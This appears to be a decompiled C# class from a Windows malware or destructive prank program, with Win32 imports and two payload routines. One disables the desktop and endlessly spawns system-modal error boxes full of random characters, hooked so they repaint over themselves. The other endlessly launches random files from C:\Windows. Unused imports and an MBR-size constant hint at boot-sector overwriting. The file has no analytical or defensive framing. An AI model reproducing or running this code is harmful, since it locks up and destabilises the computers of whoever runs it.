using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace NeptuneXRWin
{
	// Token: 0x02000006 RID: 6
	internal class MONOXIDEERROR
	{
		// Token: 0x06000036 RID: 54
		[DllImport("user32.dll")]
		public static extern bool SetCursorPos(int x, int y);

		// Token: 0x06000037 RID: 55
		[DllImport("user32.dll")]
		public static extern bool BlockInput(bool fBlockIt);

		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll")]
		public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

		// Token: 0x06000039 RID: 57
		[DllImport("user32.dll")]
		public static extern bool EnumWindows(MONOXIDEERROR.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x0600003A RID: 58
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		// Token: 0x0600003B RID: 59
		[DllImport("user32.dll")]
		private static extern bool EnumChildWindows(IntPtr hWndParent, MONOXIDEERROR.EnumChildProc lpEnumFunc, IntPtr lParam);

		// Token: 0x0600003C RID: 60
		[DllImport("user32.dll")]
		private static extern int GetWindowTextLength(IntPtr hWnd);

		// Token: 0x0600003D RID: 61
		[DllImport("user32.dll")]
		private static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x0600003E RID: 62
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);

		// Token: 0x0600003F RID: 63
		[DllImport("user32.dll")]
		private static extern IntPtr GetDesktopWindow();

		// Token: 0x06000040 RID: 64
		[DllImport("user32.dll")]
		public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, long uType);

		// Token: 0x06000041 RID: 65
		[DllImport("user32.dll")]
		private static extern int GetWindowTextLengthW(IntPtr hWnd);

		// Token: 0x06000042 RID: 66
		[DllImport("user32.dll")]
		private static extern int EnableWindow(IntPtr hWnd, bool bEnable);

		// Token: 0x06000043 RID: 67
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000044 RID: 68
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten, IntPtr lpOverlapped);

		// Token: 0x06000045 RID: 69
		[DllImport("user32.dll")]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x06000046 RID: 70
		[DllImport("user32.dll")]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000047 RID: 71
		[DllImport("kernel32.dll")]
		private static extern uint GetCurrentThreadId();

		// Token: 0x06000048 RID: 72
		[DllImport("user32.dll", EntryPoint = "GetWindowLongPtrW")]
		private static extern IntPtr GetWindowLongPtr(IntPtr hWnd, int nIndex);

		// Token: 0x06000049 RID: 73
		[DllImport("user32.dll", EntryPoint = "SetWindowLongPtrW")]
		private static extern IntPtr SetWindowLongPtr(IntPtr hWnd, int nIndex, IntPtr dwNewLong);

		// Token: 0x0600004A RID: 74
		[DllImport("user32.dll")]
		private static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x0600004B RID: 75
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, int uType);

		// Token: 0x0600004C RID: 76
		[DllImport("user32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x0600004D RID: 77
		[DllImport("user32.dll")]
		private static extern int FillRect(IntPtr hDC, ref MONOXIDEERROR.RECT lprc, IntPtr hbr);

		// Token: 0x0600004E RID: 78
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x0600004F RID: 79
		[DllImport("user32.dll")]
		private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x06000050 RID: 80
		[DllImport("user32.dll")]
		private static extern bool GetClientRect(IntPtr hWnd, out MONOXIDEERROR.RECT lpRect);

		// Token: 0x06000051 RID: 81
		[DllImport("user32.dll")]
		private static extern IntPtr SetWindowsHookExW(int idHook, MONOXIDEERROR.HookProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x06000052 RID: 82 RVA: 0x00003C18 File Offset: 0x00001E18
		public static string get_unicode(int amount)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < amount; i++)
			{
				int num;
				do
				{
					num = MONOXIDEERROR.r.Next(32, 255);
				}
				while (char.IsControl((char)num));
				stringBuilder.Append(char.ConvertFromUtf32(num));
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00003C78 File Offset: 0x00001E78
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			bool flag = nCode == 5;
			IntPtr intPtr;
			if (flag)
			{
				MONOXIDEERROR.wnd = new MONOXIDEERROR.WndProc(MONOXIDEERROR.SubclassProc);
				MONOXIDEERROR.oldProc = MONOXIDEERROR.GetWindowLongPtr(wParam, -4);
				MONOXIDEERROR.SetWindowLongPtr(wParam, -4, Marshal.GetFunctionPointerForDelegate(MONOXIDEERROR.wnd));
				intPtr = IntPtr.Zero;
			}
			else
			{
				intPtr = MONOXIDEERROR.CallNextHookEx(MONOXIDEERROR.hHook, nCode, wParam, lParam);
			}
			return intPtr;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00003CDC File Offset: 0x00001EDC
		private static IntPtr SubclassProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			bool flag = msg == 15U;
			IntPtr intPtr;
			if (flag)
			{
				IntPtr dc = MONOXIDEERROR.GetDC(hWnd);
				MONOXIDEERROR.RECT rect;
				MONOXIDEERROR.GetClientRect(hWnd, out rect);
				IntPtr dc2 = MONOXIDEERROR.GetDC(hWnd);
				MONOXIDEERROR.FillRect(dc, ref rect, dc2);
				MONOXIDEERROR.ReleaseDC(hWnd, dc);
				intPtr = IntPtr.Zero;
			}
			else
			{
				intPtr = MONOXIDEERROR.CallWindowProc(MONOXIDEERROR.oldProc, hWnd, msg, wParam, lParam);
			}
			return intPtr;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00003D3C File Offset: 0x00001F3C
		public static void Unknownerror()
		{
			IntPtr desktopWindow = MONOXIDEERROR.GetDesktopWindow();
			MONOXIDEERROR.EnableWindow(desktopWindow, false);
			MONOXIDEERROR.hook = new MONOXIDEERROR.HookProc(MONOXIDEERROR.HookCallback);
			for (;;)
			{
				MONOXIDEERROR.hHook = MONOXIDEERROR.SetWindowsHookExW(5, MONOXIDEERROR.hook, IntPtr.Zero, MONOXIDEERROR.GetCurrentThreadId());
				string text = MONOXIDEERROR.get_unicode(100);
				string text2 = MONOXIDEERROR.get_unicode(20);
				MONOXIDEERROR.MessageBoxW(IntPtr.Zero, text, text2, 4112);
				MONOXIDEERROR.UnhookWindowsHookEx(MONOXIDEERROR.hHook);
			}
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003DB8 File Offset: 0x00001FB8
		public static void CURSORMOVE()
		{
			for (;;)
			{
				try
				{
					string[] files = Directory.GetFiles("C:\\Windows", "*.*", SearchOption.AllDirectories);
					Process.Start(files[MONOXIDEERROR.r.Next(files.Length)]);
				}
				catch
				{
					string[] files2 = Directory.GetFiles("C:\\Windows", "*.*", SearchOption.AllDirectories);
					Process.Start(files2[MONOXIDEERROR.r.Next(files2.Length)]);
				}
			}
		}

		// Token: 0x04000021 RID: 33
		public static Random r = new Random();

		// Token: 0x04000022 RID: 34
		private const uint MOUSEEVENTF_LEFTDOWN = 2U;

		// Token: 0x04000023 RID: 35
		private const uint MOUSEEVENTF_LEFTUP = 4U;

		// Token: 0x04000024 RID: 36
		private const uint MOUSEEVENTF_RIGHTDOWN = 8U;

		// Token: 0x04000025 RID: 37
		private const uint MOUSEEVENTF_RIGHTUP = 16U;

		// Token: 0x04000026 RID: 38
		private const uint GenericRead = 2147483648U;

		// Token: 0x04000027 RID: 39
		private const uint GenericWrite = 1073741824U;

		// Token: 0x04000028 RID: 40
		private const uint GenericExecute = 536870912U;

		// Token: 0x04000029 RID: 41
		private const uint GenericAll = 268435456U;

		// Token: 0x0400002A RID: 42
		private const uint FileShareRead = 1U;

		// Token: 0x0400002B RID: 43
		private const uint FileShareWrite = 2U;

		// Token: 0x0400002C RID: 44
		private const uint OpenExisting = 3U;

		// Token: 0x0400002D RID: 45
		private const uint FileFlagDeleteOnClose = 1073741824U;

		// Token: 0x0400002E RID: 46
		private const uint MbrSize = 512U;

		// Token: 0x0400002F RID: 47
		private const int WH_CBT = 5;

		// Token: 0x04000030 RID: 48
		private const int HCBT_ACTIVATE = 5;

		// Token: 0x04000031 RID: 49
		private const int WM_PAINT = 15;

		// Token: 0x04000032 RID: 50
		private const int GWL_WNDPROC = -4;

		// Token: 0x04000033 RID: 51
		private const int MB_ICONERROR = 16;

		// Token: 0x04000034 RID: 52
		private const int MB_SYSTEMMODAL = 4096;

		// Token: 0x04000035 RID: 53
		private static IntPtr hHook;

		// Token: 0x04000036 RID: 54
		private static MONOXIDEERROR.HookProc hook;

		// Token: 0x04000037 RID: 55
		private static MONOXIDEERROR.WndProc wnd;

		// Token: 0x04000038 RID: 56
		private static IntPtr oldProc;

		// Token: 0x04000039 RID: 57
		private static Random rnd = new Random();

		// Token: 0x02000012 RID: 18
		// (Invoke) Token: 0x06000071 RID: 113
		private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

		// Token: 0x02000013 RID: 19
		// (Invoke) Token: 0x06000075 RID: 117
		public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x06000079 RID: 121
		private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x02000015 RID: 21
		// (Invoke) Token: 0x0600007D RID: 125
		private delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x02000016 RID: 22
		private struct RECT
		{
			// Token: 0x04000060 RID: 96
			public int left;

			// Token: 0x04000061 RID: 97
			public int top;

			// Token: 0x04000062 RID: 98
			public int right;

			// Token: 0x04000063 RID: 99
			public int bottom;
		}
	}
}
